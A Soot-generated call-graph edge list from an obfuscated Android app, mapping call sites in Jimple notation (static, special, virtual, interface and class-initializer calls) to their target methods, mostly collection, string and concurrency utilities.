STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r4, $i0, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r11.<lvt: void <init>(lvr)>($r15) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: void <init>(lvr)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r2, $i2, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(2) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
CLINIT edge: staticinvoke <lnd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lnd: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("cause", class "Ljava/lang/Throwable;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Class: boolean isAssignableFrom(java.lang.Class)>($r4) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: boolean isAssignableFrom(java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(10) in <lvr: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(2) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <java.lang.Long: java.lang.Long valueOf(long)>($l0) in <hbu: hbs f(java.lang.String,long)> ==> <java.lang.Long: java.lang.Long valueOf(long)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.c: void <init>(long)> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <jsg: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jsg: void <clinit>()>
CLINIT edge: staticinvoke <ltc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltc: void <clinit>()>
SPECIAL edge: specialinvoke $r5.<hno: void <init>()>() in <hnt: void <clinit>()> ==> <hno: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(13) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <lwh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwh: void <clinit>()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<lsh: void <init>(lto)>($r2) in <lsh: lsh j(java.lang.String)> ==> <lsh: void <init>(lto)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int)>($i1) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <lje: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Float: java.lang.Float valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <lkh: java.lang.Object[] toArray()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Set: java.util.Iterator iterator()>() in <ljf: java.util.Iterator iterator()> ==> <java.util.HashSet: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(java.util.List)> ==> <java.util.AbstractMap: void <init>()>
SPECIAL edge: specialinvoke r1.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Local", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(93) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r0) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean isEmpty()>() in <lqs: boolean equals(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r0 = virtualinvoke $r4.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Double: boolean isNaN(double)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gwk: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hno: void <init>()> ==> <iec: void <init>()>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lkq: lsb C(int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int j()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsb: boolean hasNext()>() in <lsb: java.lang.Object next()> ==> <lsb: boolean hasNext()>
STATIC edge: $r4 = staticinvoke <java.lang.Integer: java.lang.String toHexString(int)>($i2) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Integer: java.lang.String toHexString(int)>
STATIC edge: $r3 = staticinvoke <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>("GMT") in <ose: void <clinit>()> ==> <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lkm: void <init>(lkq,int)>(r0, $i0) in <lkq: lsb C(int)> ==> <lkm: void <init>(lkq,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkg: void c(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Class getClass()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lvr: int hashCode()>() in <lvt: int hashCode()> ==> <lvr: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmc: void <init>(lme)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lji: void <init>(java.util.Comparator)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsn: void <init>(java.util.logging.Level)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[0-9]+") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lsw d()>() in <lsn: lsw i(lsq)> ==> <lsf: lsw d()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
SPECIAL edge: specialinvoke $r0.<lqs: void <init>(lkq,java.util.Comparator)>($r2, $r1) in <lqs: void <clinit>()> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(17) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqs: int size()>
SPECIAL edge: specialinvoke $r4.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.w: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r6 = staticinvoke <ivw: java.lang.String l(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: java.lang.String l(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object[],int)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<lki: void <init>(java.lang.Object,java.lang.Object)>($r0, $r1) in <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)> ==> <lki: void <init>(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r14.<lvt: boolean a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: boolean a()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean containsAll(java.util.Collection)>($r4) in <lqs: boolean equals(java.lang.Object)> ==> <lqs: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(11) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int rotateLeft(int,int)>($i0, 15) in <izw: int ac(int)> ==> <java.lang.Integer: int rotateLeft(int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String toString()>
STATIC edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void c()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: void c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsu: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r2.<lji: void <init>(java.util.Comparator)>($r0) in <lqd: lqd b(java.util.Comparator)> ==> <lji: void <init>(java.util.Comparator)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $l4 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long get()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long get()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmp: void <init>()> ==> <lma: void <init>()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStickerSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i1 = staticinvoke <java.lang.Math: int max(int,int)>($i1, 2) in <lma: int e(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int size()>() in <liy: int size()> ==> <ljd: int size()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] x()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>($r2, $r1, $i0, r0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractCollection: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<lvt: void <init>(lvr)>($r3) in <lvt: void <clinit>()> ==> <lvt: void <init>(lvr)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.Object w(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r6.<lly: void j(java.lang.Object)>($r8) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: void j(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i1 = interfaceinvoke $r2.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lrg: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r9 = virtualinvoke $r9.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(64) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean isEmpty()>() in <ljf: int c()> ==> <ljf: boolean isEmpty()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r4.<ltc: void <init>(java.lang.String,int,int)>("FULL", 3, $i0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: staticinvoke <iye: void D(boolean,java.lang.String,int,int)>(1, "min (%s) must be less than or equal to max (%s)", $i0, $i1) in <kwe: int U(int,int,int)> ==> <iye: void D(boolean,java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
